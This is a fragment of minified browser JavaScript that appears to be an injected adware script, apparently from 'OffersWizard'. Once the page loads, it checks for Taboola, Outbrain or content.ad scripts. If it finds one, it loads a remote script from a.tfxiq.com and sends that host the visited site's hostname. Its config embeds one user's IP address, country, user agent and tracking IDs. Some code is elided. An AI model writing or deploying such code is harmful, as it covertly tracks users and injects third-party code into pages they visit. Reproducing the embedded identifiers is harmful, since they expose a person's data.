(function(a,b,c,d,e,f,_){
	...
	//////////
	var qqq=0;
	function bbb(y,x,w,v,u,t,s,r,o){
		if(qqq)return;
		if('complete'==b.readyState){
			y=z('script,iframe')[0];x=/^http(s)?:\/\/[^\/]+\//;w=/(taboola\.com|outbrain\.com|content\.ad)\//;
			for(o=0;v=y[o];o++){
				u=x.exec(v.src);
				if(u){
					t=w.exec(u[0]);
					if(t){
						z.script(d+'/f.php?a='+p(t[1])+'&b='+p(c.hostname));qqq=1;
						return;
					}
				}
			}
	...
	bbb();
	z(b).bind('readystatechange',bbb);
})(window,document,location,'//a.tfxiq.com',{"a":{"ref1":"616d6f6e6574697a65","ref2":"14698","ref3":"","tuid":"091D3289CF87A4CEE60D39B7A83506F1","teid":"091D3289CF87A4CEE60D39B7A83506F1","uuid":"3b1da72be9e15f2ce343d19299a773da","user_ip":"111.92.134.122","cc":"PK","CRPName":"OffersWizard","user_agent":"Mozilla\/5.0 (Windows NT 10.0; WOW64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/46.0.2490.86 Safari\/537.36","pid":"149"},"b":["a.tfxiq.com\/rt.php?"]},'!)(@#*&$%^')
